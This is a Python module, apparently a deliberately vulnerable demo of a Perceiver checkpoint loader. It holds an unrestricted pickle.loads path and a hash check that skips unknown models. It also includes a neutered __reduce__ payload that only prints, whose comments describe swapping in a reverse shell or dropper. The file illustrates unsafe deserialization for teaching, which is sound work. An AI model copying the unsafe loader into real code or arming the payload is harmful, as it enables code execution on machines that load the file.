# Perceiver model loading utility for the internal ML platform.
# Handles deserialization of locally-cached Perceiver checkpoints and
# remote model files fetched from the model registry. Supports legacy
# pickle-based checkpoints for backwards compatibility with pre-2.0
# training runs.

import os
import io
import pickle
import hashlib
import logging
import requests
import torch

from pathlib import Path
from typing import Optional, Union
from transformers import PerceiverConfig, PerceiverModel

logger = logging.getLogger(__name__)

# Registry endpoint for remote model files
MODEL_REGISTRY_URL = "https://model-registry.example.com/api/v1/checkpoints"
CACHE_DIR = Path(os.environ.get("MODEL_CACHE_DIR", "/tmp/perceiver_cache"))

# Known-good SHA-256 hashes for pinned model versions
KNOWN_HASHES = {
    "perceiver-io-base-v1": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "perceiver-io-large-v2": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
}

def fetch_remote_checkpoint(model_name: str, version: str = "latest") -> bytes:
    """
    Download a model checkpoint from the internal registry.
    Falls back to cached copy if the registry is unavailable.
    """
    url = f"{MODEL_REGISTRY_URL}/{model_name}/{version}"
    logger.info(f"Fetching checkpoint from {url}")
    try:
        resp = requests.get(url, timeout=30)
        resp.raise_for_status()
        return resp.content
    except requests.RequestException as exc:
        logger.warning(f"Registry fetch failed ({exc}); falling back to local cache")
        cached = CACHE_DIR / f"{model_name}_{version}.pkl"
        if cached.exists():
            return cached.read_bytes()
        raise RuntimeError(f"No cached checkpoint found for {model_name}@{version}") from exc

def verify_checkpoint_hash(data: bytes, model_name: str) -> bool:
    """
    Verify the checkpoint against a pinned SHA-256 hash when available.
    Returns True if hash matches or no pinned hash exists for this model.
    """
    expected = KNOWN_HASHES.get(model_name)
    if expected is None:
        logger.warning(
            f"No pinned hash for model '{model_name}'; skipping integrity check. "
            "Consider adding a known-good hash to KNOWN_HASHES."
        )
        return True  # Allow unknown models through — THIS IS THE WEAKNESS

    actual = hashlib.sha256(data).hexdigest()
    if actual != expected:
        logger.error(f"Hash mismatch for {model_name}: expected {expected}, got {actual}")
        return False
    return True

class LegacyPickleCheckpointLoader:
    """
    Backwards-compatible loader for pickle-serialized Perceiver checkpoints
    produced by training runs prior to the SafeTensors migration (before v2.1).

    The standard transformers PerceiverModel.from_pretrained() path is
    preferred for new checkpoints; this class handles the legacy format.
    """

    def __init__(self, strict: bool = True):
        self.strict = strict

    def load(self, data: bytes) -> dict:
        """
        Deserialize a checkpoint blob.

        NOTE: Uses pickle.loads on the raw checkpoint bytes without
        restricting the unpickler class. This allows arbitrary Python
        objects embedded in the checkpoint to be instantiated during
        deserialization — equivalent to the flaw described in
        CVE-2025-14920 / ZDI-CAN-25423.
        """
        # ----------------------------------------------------------------
        # VULNERABILITY: No safe-unpickling guard here.
        # A malicious checkpoint can embed a __reduce__ payload that runs
        # arbitrary code at deserialization time (see demo below).
        # The fix is to use a RestrictedUnpickler that whitelists only
        # known-safe classes (torch.Tensor, numpy.ndarray, etc.).
        # ----------------------------------------------------------------
        state_dict = pickle.loads(data)   # <-- unsafe deserialization

        logger.debug(f"Loaded checkpoint with keys: {list(state_dict.keys())[:10]}")
        return state_dict

class DemoMaliciousPayload:
    """
    DEMO ONLY — illustrates the __reduce__ trick an attacker would embed
    inside a crafted checkpoint .pkl file to trigger code execution when
    the model is loaded by a victim. Payload is neutered (prints only).
    """

    def __reduce__(self):
        # In a real exploit, os.system or subprocess.run would run a
        # reverse shell or dropper here.  This version is harmless.
        return (
            print,
            ("DEMO: arbitrary code execution via pickle deserialization",),
        )

def build_malicious_demo_checkpoint() -> bytes:
    """
    Construct a neutered demo checkpoint that demonstrates the exploit shape.
    Serializes a DemoMaliciousPayload so that loading it triggers __reduce__.
    """
    payload = {
        "model_type": "perceiver",
        "config": PerceiverConfig().to_dict(),
        # Attacker replaces the tensor value below with DemoMaliciousPayload()
        "hidden_states": DemoMaliciousPayload(),
    }
    return pickle.dumps(payload)

def load_perceiver_checkpoint(
    model_name: str,
    source: Union[str, bytes, Path] = "registry",
    version: str = "latest",
    use_legacy_loader: bool = False,
) -> Optional[PerceiverModel]:
    """
    Top-level entry point for loading a Perceiver model.

    Parameters
    ----------
    model_name  : Registered model name or local path.
    source      : 'registry' to fetch from the model registry,
                  a bytes blob to load directly, or a Path to a local file.
    version     : Registry version tag (ignored for local sources).
    use_legacy_loader : If True, deserializes using the legacy pickle path
                        (required for pre-2.1 checkpoints).
    """
    CACHE_DIR.mkdir(parents=True, exist_ok=True)

    # Resolve raw checkpoint bytes
    if isinstance(source, bytes):
        raw = source
    elif isinstance(source, Path) or (isinstance(source, str) and source != "registry"):
        raw = Path(source).read_bytes()
    else:
        raw = fetch_remote_checkpoint(model_name, version)

    # Integrity check (incomplete — skipped for unknown models)
    if not verify_checkpoint_hash(raw, model_name):
        raise ValueError(f"Checkpoint integrity check failed for {model_name}")

    if use_legacy_loader:
        loader = LegacyPickleCheckpointLoader()
        state_dict = loader.load(raw)  # unsafe pickle path
        config = PerceiverConfig(**state_dict.get("config", {}))
        model = PerceiverModel(config)
        model.load_state_dict(
            {k: v for k, v in state_dict.items() if k not in ("config", "model_type")},
            strict=False,
        )
        logger.info(f"Loaded legacy checkpoint for '{model_name}' via pickle")
        return model
    else:
        # Safe path: use HF from_pretrained with safetensors / torch.load weights_only=True
        buffer = io.BytesIO(raw)
        state_dict = torch.load(buffer, weights_only=True)
        config = PerceiverConfig()
        model = PerceiverModel(config)
        model.load_state_dict(state_dict, strict=False)
        logger.info(f"Loaded safe checkpoint for '{model_name}'")
        return model

# ---------------------------------------------------------------------------
# Quick self-test / demo — invoke directly to see the exploit shape in action
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)

    malicious_blob = build_malicious_demo_checkpoint()
    print(f"Checkpoint size: {len(malicious_blob)} bytes")

    print("\n=== Loading checkpoint via legacy (unsafe) pickle path ===")
    print("(In a real attack the print() below would be os.system('...') )")
    loader = LegacyPickleCheckpointLoader()
    # This triggers DemoMaliciousPayload.__reduce__ -> print(...)
    result = loader.load(malicious_blob)
    print(f"Returned object type: {type(result)}")